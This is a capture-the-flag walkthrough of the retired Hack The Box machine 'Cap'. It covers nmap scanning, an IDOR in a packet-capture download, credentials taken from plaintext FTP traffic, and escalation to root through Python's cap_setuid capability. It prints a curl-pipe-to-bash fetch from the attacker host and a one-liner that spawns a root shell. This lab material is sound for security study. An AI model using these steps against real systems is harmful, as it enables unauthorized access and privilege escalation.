# Box
Name: Cap
ID: 6 
Difficulty: Easy 
Status: Retired

## 🧠 Attacker Environment
- **Host OS**: Parrot Security OS (VM) - CHANGE

## 🛠️ Tools Used
  - `ping`
  - `nmap`
  - `wireshark`
  - `linPEAS`

## 🎯 Target Environment
- **Ip Address**: 10.10.10.245
- **OS**: Debian GNU/Linux

## 🧠 Recon
Host is blocking pings, returned ports are filtered in first nmap scan:
```bash
nmap 10.10.10.245 
```

## 🔍 Enumeration
1. Ran full port scan which returned 3 open ports: 21,22,80:
```bash
ports=$(nmap -p- --min-rate=1000 -Pn -T4 10.10.10.245 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//')
```
2. Investigated found open ports with third nmap scan: 
```bash
nmap -p$ports -Pn -sC -sV 10.10.10.245
```
3. Found the following open ports running services:
```bash
21/tcp ftp
22/tcp ssh
80/tcp http
```

4. Tried to connect via FTP with both anonymous andd default credentials - failed.

5. Opened 10.10.10.245:80 in browser, found **Security Dashboard**:
    - IP Config page
   - Network Status page
   - Option to download a **packet capture** ("Security Snapshot")

6. Downloaded and opened the `1.pcap` in Wireshark — only contained my own traffic.

7. Found an **IDOR vulnerability** by modifying the download URL and downloading `0.pcap` :
```http
http://10.10.10.245/data/0
```
   - This revealed previous user activity.

## 💥 Foothold
Opening the ID 0 capture file in Wireshark revealed **unencrypted FTP traffic**, including credentials:

- **Username**: `nathan`
- **Password**: `Buck3tH4TF0RM3!`

1. Found credentials allowed access via FTP **and** SSH
```bash
ssh nathan@10.10.10.245
```
```bash
ftp 10.10.10.245
```
## 🔐 Privilege Escalation
1. Hosted LinPEAS on attacker box:
```bash
sudo python3 -m http.server 80
```

2. On the target box, fetched and ran LinPEAS:
```bash
curl http://10.10.14.7/linpeas.sh | bash
```

3. **LinPEAS Discovery: Binary Capabilities**
```bash
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

This means: 
-python3.8 can set UID to 0 (root) without being SUID
-Very powerful escalation vector

4. Escalation with Python
Ran the following to spawn a root shell:
```bash
python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
whoami
# root
```

5. Retrieved the flags: 
cat /home/nathan/user.txt
cat /root/root.txt

## 🧼 Cleanup & Lessons
-Removed linpeas.sh
-Logged out of all sessions
- **Key takeaways**:
-The developer may have granted Python this capability to allow a backend process (like the Security Dashboard or packet capture service) to run as root without using a setuid binary — but this introduces a critical security risk.
-cap_setuid allows privilege escalation without the SUID bit
-LinPEAS is excellent at spotting obscure privilege vectors
-IDOR vulnerabilities can leak sensitive network data
-Never trust plaintext protocols like FTP — always inspect pcap files closely
